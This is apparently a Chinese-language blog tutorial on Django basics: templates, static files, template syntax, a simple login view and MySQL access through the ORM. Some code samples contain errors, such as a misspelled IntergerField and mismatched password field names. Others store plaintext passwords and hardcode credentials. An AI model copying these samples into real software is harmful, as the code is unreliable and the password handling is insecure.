<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;User List&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_add</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;User add&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="templates模板的运用">templates模板的运用</span></h2><span id="more"></span>
<p>编辑<code>app01/views.py</code>，使用render返回一个HTML页面</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">return</span> render(request, <span class="string">&quot;user_list.html&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>app01目录下创建<code>templates/user_list.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>User List<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="引用静态文件">引用静态文件</span></h2><p>在app目录下创建static目录，image、css、js都放在static目录下，static目录结构:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static</span><br><span class="line">|- css</span><br><span class="line">|- img</span><br><span class="line">|- js</span><br><span class="line">|- plugins</span><br></pre></td></tr></table></figure>

<p>引用Bootstrap, JQuery, image, 编辑<code>templates/user_list.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% static &#x27;plugins/bootstrap-3.4.1/css/bootstrap.css&#x27; %&#125;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>User List<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Create&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;img/1.png&#x27; %&#125;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;js/jquery-3.7.1.min.js&#x27; %&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;plugins/bootstrap-3.4.1/js/bootstrap.js&#x27; %&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Q: 为什么使用load static这种方式引入静态文件？&#x2F;static&#x2F;img&#x2F;1.png不也行吗？<br>A: 如果静态文件移动到别的路径，只需要改settings.py的配置，不需要逐个修改每个页面的路径</p>
<h2><span id="django模板语法">Django模板语法</span></h2><p>什么是Django模板: 在HTML中写一些占位符，由数据对占位符进行替换和处理</p>
<p>举例:<br>编辑<code>app01/views.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tpl</span>(<span class="params">request</span>):</span><br><span class="line">    name = <span class="string">&#x27;Peter&#x27;</span></span><br><span class="line">    roles = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>]</span><br><span class="line">    user_info = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tony&#x27;</span>, <span class="string">&#x27;salary&#x27;</span>: <span class="number">10000</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;CEO&#x27;</span>&#125;</span><br><span class="line">	data_list = [</span><br><span class="line">        &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;peter&quot;</span>, <span class="string">&quot;salary&quot;</span>: <span class="number">10000</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;CTO&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;tony&quot;</span>, <span class="string">&quot;salary&quot;</span>: <span class="number">5000</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;CFO&quot;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;tpl.html&#x27;</span>, &#123;<span class="string">&quot;n1&quot;</span>: name, <span class="string">&quot;n2&quot;</span>: roles, <span class="string">&quot;n3&quot;</span>: user_info, <span class="string">&quot;n4&quot;</span>: data_list&#125;)</span><br></pre></td></tr></table></figure>
<p>编辑<code>demo1/urls.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;user/tpl/&#x27;</span>, views.tpl),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>新增<code>app01/templates/tpl.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; n1 &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; n2 &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; n2.0 &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; n2.1 &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;% for item in n2 %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">	</span><br><span class="line">    &#123;&#123; n3.name &#125;&#125;</span><br><span class="line">    &#123;&#123; n3.salary &#125;&#125;</span><br><span class="line">    &#123;&#123; n3.role &#125;&#125;</span><br><span class="line">    &#123;% for k,v in n3.items %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; k &#125;&#125; == &#123;&#123; v &#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% for k in n3.keys %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; k &#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% for v in n3.values %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; v &#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; n4 &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% for item in n4 %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; item.name &#125;&#125;, &#123;&#123; item.salary &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">	</span><br><span class="line">	&#123;% if n1 == &#x27;Peter&#x27; %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>Peter!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>Not Peter!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>curl localhost:8000&#x2F;user&#x2F;tpl&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Peter</span><br><span class="line">[&#x27;admin&#x27;, &#x27;guest&#x27;]</span><br><span class="line">admin</span><br><span class="line">guest</span><br><span class="line">admin guest</span><br><span class="line">Tony 10000 CEO</span><br><span class="line">name == Tony</span><br><span class="line">salary == 10000</span><br><span class="line">role == CEO</span><br><span class="line">name</span><br><span class="line">salary</span><br><span class="line">role</span><br><span class="line">Tony</span><br><span class="line">10000</span><br><span class="line">CEO</span><br><span class="line">[&#123;&#x27;name&#x27;: &#x27;peter&#x27;, &#x27;salary&#x27;: 10000, &#x27;role&#x27;: &#x27;CTO&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;tony&#x27;, &#x27;salary&#x27;: 5000, &#x27;role&#x27;: &#x27;CFO&#x27;&#125;]</span><br><span class="line">peter, 10000</span><br><span class="line">tony, 5000</span><br><span class="line">Peter!</span><br></pre></td></tr></table></figure>

<h2><span id="案例简单的用户登录无数据库">案例：简单的用户登录(无数据库)</span></h2><p>编辑demo1&#x2F;urls.py, 添加映射</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;login/&#x27;</span>, views.login),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>编辑app01&#x2F;views.py, 实现login函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    username = request.POST.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;root&quot;</span> <span class="keyword">and</span> password == <span class="string">&quot;123&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;login.html&quot;</span>, &#123;<span class="string">&quot;error_msg&quot;</span>: <span class="string">&quot;Login Failed&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>新增app01&#x2F;template&#x2F;login.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>User Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/login/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>, <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>, <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>, <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>, <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>提交表单后报错: CSRF verification failed, Forbidden(403)<br>解决方法: 在form表单里加<code>&#123;% csrf_token %&#125;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>User Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/login/&quot;</span>&gt;</span></span><br><span class="line">	&#123;% csrf_token %&#125;</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>, <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>, <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>, <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>, <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="django连接mysql数据库">Django连接MySQL数据库</span></h2><p>框架：业务代码 -&gt; ORM -&gt; (pymysql,MySQLdb,mysqlclient) -&gt; Database</p>
<h3><span id="安装mysql">安装MySQL</span></h3><p>参考: <a href="https://pcj600.github.io/2024/0916144756.html">https://pcj600.github.io/2024/0916144756.html</a></p>
<h3><span id="安装mysqlclient">安装mysqlclient</span></h3><p>参考: <a href="https://pcj600.github.io/2024/0916170317.html">https://pcj600.github.io/2024/0916170317.html</a></p>
<h3><span id="orm">ORM</span></h3><ul>
<li>支持创建、修改、删除表(不用你写SQL语句), 但无法创建数据库</li>
<li>操作表中的数据(不用你写SQL语句)</li>
</ul>
<h3><span id="创建数据库">创建数据库</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p </span><br><span class="line">create database gx_day15 DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure>
<ul>
<li>DEFAULT CHARSET utf8: 指定了数据库的默认字符集。</li>
<li>COLLATE utf8_general_ci: 表示使用 utf8 字符集的不区分大小写的校对规则(ci 表示 case-insensitive)s</li>
</ul>
<h3><span id="连接数据库">连接数据库</span></h3><p><a href="https://docs.djangoproject.com/en/5.1/ref/databases/#mysql-notes">https://docs.djangoproject.com/en/5.1/ref/databases/#mysql-notes</a></p>
<p>编辑demo1&#x2F;settings.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">	<span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">		<span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;gx_day15&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;XXX&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;PORT&#x27;</span>: <span class="number">3306</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="创建-修改表">创建、修改表</span></h3><p>创建表不需要写SQL语句，只需在app01&#x2F;models.py里定义一个类</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">	name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">	password = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">	age = models.IntergerField(default=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>相当于创建了一个表，表名: app01_userinfo</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> app01_userinfo(</span><br><span class="line">	id <span class="type">bigint</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">	name <span class="type">varchar</span>[<span class="number">32</span>],</span><br><span class="line">	password <span class="type">varchar</span>[<span class="number">64</span>],</span><br><span class="line">	age <span class="type">int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>执行命令，让Django真正创建表。<br>先确认APP已经注册：demo1&#x2F;settings.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;app01.apps.App01Config&#x27;</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>在项目根目录执行:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 manage.py makemigrations</span><br><span class="line">python3 manage.py migrate</span><br></pre></td></tr></table></figure>

<p>查看表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p </span><br><span class="line">mysql&gt; use gx_day15;</span><br><span class="line">mysql&gt; desc app01_userinfo;</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field    | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id       | bigint      | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name     | varchar(32) | NO   |     | NULL    |                |</span><br><span class="line">| password | varchar(64) | NO   |     | NULL    |                |</span><br><span class="line">| age      | int         | NO   |     | NULL    |                |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>表中新增列时，由于已存在列中可能已有数据，所以新增列必须要指定新增列对应的数据:</p>
<ul>
<li>手动输入一个值</li>
<li>设置默认值</li>
</ul>
<p>删除表: 在models.py里删掉对应的类，再执行</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python3 manage.py makemigrations</span><br><span class="line">python3 manage.py migrate</span><br></pre></td></tr></table></figure>

<h3><span id="创建表中的数据">创建表中的数据</span></h3><p>app01&#x2F;models.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Department</span>(models.Model):</span><br><span class="line">    title = models.CharField(max_length=<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01.models <span class="keyword">import</span> Department,UserInfo</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orm</span>(<span class="params">request</span>):</span><br><span class="line">    Department.objects.create(title=<span class="string">&#x27;sales&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;ORM OK&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="删除表中数据">删除表中数据</span></h3><p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01.models <span class="keyword">import</span> Department,UserInfo</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orm</span>(<span class="params">request</span>):</span><br><span class="line">    Department.objects.<span class="built_in">filter</span>(title=<span class="string">&#x27;sales&#x27;</span>).delete() <span class="comment"># 删掉所有title=sales的数据</span></span><br><span class="line">	Department.objects.<span class="built_in">all</span>().delete() <span class="comment"># 所有数据都删掉</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;ORM OK&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="更新表中数据">更新表中数据</span></h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">data_list = UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> data_list:</span><br><span class="line">	<span class="built_in">print</span>(obj.<span class="built_in">id</span>, obj.name, obj.password)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># data_list = UserInfo.objects.filter(id=1)</span></span><br><span class="line">	o = UserInfo.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">1</span>).first()</span><br><span class="line">	<span class="built_in">print</span>(o.<span class="built_in">id</span>, o.name, o.password)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 更新所有行的数据</span></span><br><span class="line">	UserInfo.objects.<span class="built_in">all</span>().update(password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	UserInfo.objects.<span class="built_in">filter</span>(name=<span class="string">&#x27;peter&#x27;</span>).update(password=<span class="string">&#x27;123456&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>objects.all()返回queryset类型，每个元素是一个对象</li>
<li>UserInfo.objects.filter(id&#x3D;1).first() 返回符合筛选条件的第一条数据</li>
</ul>
<h2><span id="数据库操作的案例-用户管理">数据库操作的案例 —— 用户管理</span></h2><h3><span id="显示用户">显示用户</span></h3><p>app01&#x2F;models.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    password = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    age = models.IntegerField(default=<span class="number">18</span>)</span><br></pre></td></tr></table></figure>
<p>查看数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">desc</span> app01_userinfo;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> Field    <span class="operator">|</span> Type        <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> id       <span class="operator">|</span> <span class="type">bigint</span>      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> auto_increment <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">32</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">64</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> age      <span class="operator">|</span> <span class="type">int</span>         <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> app01_userinfo;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+----------+-----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> password <span class="operator">|</span> age <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+----------+-----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> peter <span class="operator">|</span> <span class="number">123</span>      <span class="operator">|</span>  <span class="number">18</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> jack  <span class="operator">|</span> <span class="number">123</span>      <span class="operator">|</span>  <span class="number">18</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+----------+-----+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>显示用户列表<br>demo1&#x2F;urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;user/info/&#x27;</span>, views.user_info),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_info</span>(<span class="params">request</span>):</span><br><span class="line">    user_list = UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&quot;user_info.html&quot;</span>, &#123;<span class="string">&quot;user_list&quot;</span>: user_list&#125;)</span><br></pre></td></tr></table></figure>
<p>app01&#x2F;templates&#x2F;user_info.html</p>
